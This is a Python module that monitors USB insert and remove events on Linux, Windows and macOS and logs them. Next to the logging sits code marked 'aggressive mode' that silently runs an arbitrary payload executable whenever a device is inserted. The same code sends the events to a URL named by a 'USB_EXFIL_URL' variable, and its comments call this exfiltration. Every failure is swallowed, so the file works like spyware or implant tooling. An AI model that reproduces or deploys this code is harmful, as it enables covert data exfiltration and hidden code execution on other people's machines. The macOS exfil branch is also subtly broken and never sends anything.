# modules/usb_monitor_ext.py

import os
import platform
import threading
import time
import datetime
from modules.logger import log_event

# OS‐specific imports
if platform.system() == "Linux":
    try:
        from pyudev import Context, Monitor, MonitorObserver
    except ImportError:
        MonitorObserver = None
elif platform.system() == "Windows":
    try:
        import win32con
        import win32file
        import win32api
        import win32event
        import win32gui
        import ctypes
    except ImportError:
        win32file = None
else:
    # macOS: no easy hook; will poll diskutil list
    pass

USB_LOG_PATH = os.path.join(os.path.expanduser("~"), "usb_events.log")

def log_usb_event(action: str, device: dict):
    """
    Append a USB event (insert/remove) to the log and encrypted event log.
    """
    ts = datetime.datetime.utcnow().isoformat()
    line = f"{ts} | ACTION: {action} | DEV: {device}\n"
    try:
        with open(USB_LOG_PATH, "a") as f:
            f.write(line)
    except Exception:
        pass
    log_event({"type": "usb_event", "action": action, "device": device})

### Linux Implementation
def linux_usb_monitor():
    if MonitorObserver is None:
        return
    ctx = Context()
    monitor = Monitor.from_netlink(ctx)
    monitor.filter_by("usb")
    observer = MonitorObserver(monitor, callback=linux_usb_callback, name="usb-observer")
    observer.daemon = True
    observer.start()

def linux_usb_callback(action, device):
    """
    Called by pyudev when a USB device is added/removed.
    """
    dev_info = {
        "device_node": device.device_node,
        "sys_name": device.sys_name,
        "subsystem": device.subsystem,
        "action": action
    }
    log_usb_event(action, dev_info)

### Windows Implementation
def windows_usb_monitor():
    """
    Polls for volume change events via Win32 API. Logs when drives appear/disappear.
    """
    drive_set = set()
    while True:
        try:
            drives = win32api.GetLogicalDriveStrings()
            drives = drives.split('\000')[:-1]
            current = set([d for d in drives if win32file.GetDriveType(d) == win32file.DRIVE_REMOVABLE])
            # Insertions
            for d in current - drive_set:
                log_usb_event("insert", {"drive": d})
            # Removals
            for d in drive_set - current:
                log_usb_event("remove", {"drive": d})
            drive_set.clear()
            drive_set.update(current)
        except Exception:
            pass
        time.sleep(5)

### macOS Implementation
def macos_usb_monitor():
    """
    Poll /Volumes to see if new drive appears/disappears.
    """
    prev = set(os.listdir("/Volumes"))
    while True:
        try:
            curr = set(os.listdir("/Volumes"))
            # inserted = curr - prev
            for vol in curr - prev:
                log_usb_event("insert", {"volume": vol})
            # removed = prev - curr
            for vol in prev - curr:
                log_usb_event("remove", {"volume": vol})
            prev = curr
            # Enhancement: exfiltrate USB events if env var set
            exfil_url = os.getenv("USB_EXFIL_URL")
            if exfil_url:
                try:
                    import requests
                    for vol in curr - prev:
                        requests.post(exfil_url, json={"event": "insert", "volume": vol, "ts": time.time()}, timeout=5)
                    for vol in prev - curr:
                        requests.post(exfil_url, json={"event": "remove", "volume": vol, "ts": time.time()}, timeout=5)
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(5)

def start_usb_monitor():
    """
    Start the appropriate USB monitor for the current platform in a daemon thread.
    Enhanced: aggressive mode (USB_MONITOR_AGGRESSIVE=1) triggers payload on insert.
    """
    t = None
    os_type = platform.system()
    aggressive = os.getenv("USB_MONITOR_AGGRESSIVE") == "1"
    payload_path = os.getenv("USB_PAYLOAD_PATH")
    def trigger_payload(device_info):
        if payload_path and os.path.exists(payload_path):
            try:
                import subprocess
                subprocess.Popen([payload_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                log_usb_event("payload_exec", {"payload": payload_path, "device": device_info})
            except Exception:
                pass
    if os_type == "Linux" and MonitorObserver:
        def linux_usb_monitor_aggressive():
            if MonitorObserver is None:
                return
            ctx = Context()
            monitor = Monitor.from_netlink(ctx)
            monitor.filter_by("usb")
            def callback(action, device):
                dev_info = {
                    "device_node": device.device_node,
                    "sys_name": device.sys_name,
                    "subsystem": device.subsystem,
                    "action": action
                }
                log_usb_event(action, dev_info)
                if aggressive and action == "add":
                    trigger_payload(dev_info)
            observer = MonitorObserver(monitor, callback=callback, name="usb-observer")
            observer.daemon = True
            observer.start()
        t = threading.Thread(target=linux_usb_monitor_aggressive, daemon=True, name="linux-usb-mon")
        t.start()
    elif os_type == "Windows" and win32file:
        def windows_usb_monitor_aggressive():
            drive_set = set()
            while True:
                try:
                    drives = win32api.GetLogicalDriveStrings()
                    drives = drives.split('\000')[:-1]
                    current = set([d for d in drives if win32file.GetDriveType(d) == win32file.DRIVE_REMOVABLE])
                    for d in current - drive_set:
                        log_usb_event("insert", {"drive": d})
                        if aggressive:
                            trigger_payload({"drive": d})
                    for d in drive_set - current:
                        log_usb_event("remove", {"drive": d})
                    drive_set.clear()
                    drive_set.update(current)
                except Exception:
                    pass
                time.sleep(5)
        t = threading.Thread(target=windows_usb_monitor_aggressive, daemon=True, name="windows-usb-mon")
        t.start()
    elif os_type == "Darwin":
        def macos_usb_monitor_aggressive():
            prev = set(os.listdir("/Volumes"))
            while True:
                try:
                    curr = set(os.listdir("/Volumes"))
                    for vol in curr - prev:
                        log_usb_event("insert", {"volume": vol})
                        if aggressive:
                            trigger_payload({"volume": vol})
                    for vol in prev - curr:
                        log_usb_event("remove", {"volume": vol})
                    prev = curr
                    exfil_url = os.getenv("USB_EXFIL_URL")
                    if exfil_url:
                        try:
                            import requests
                            for vol in curr - prev:
                                requests.post(exfil_url, json={"event": "insert", "volume": vol, "ts": time.time()}, timeout=5)
                            for vol in prev - curr:
                                requests.post(exfil_url, json={"event": "remove", "volume": vol, "ts": time.time()}, timeout=5)
                        except Exception:
                            pass
                except Exception:
                    pass
                time.sleep(5)
        t = threading.Thread(target=macos_usb_monitor_aggressive, daemon=True, name="macos-usb-mon")
        t.start()
    else:
        log_event({"type": "usb_monitor_failed", "error": f"Unsupported OS or missing dependencies on {os_type}"})
    return t

if __name__ == "__main__":
    print("[+] Starting USB monitoring …")
    start_usb_monitor()
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass
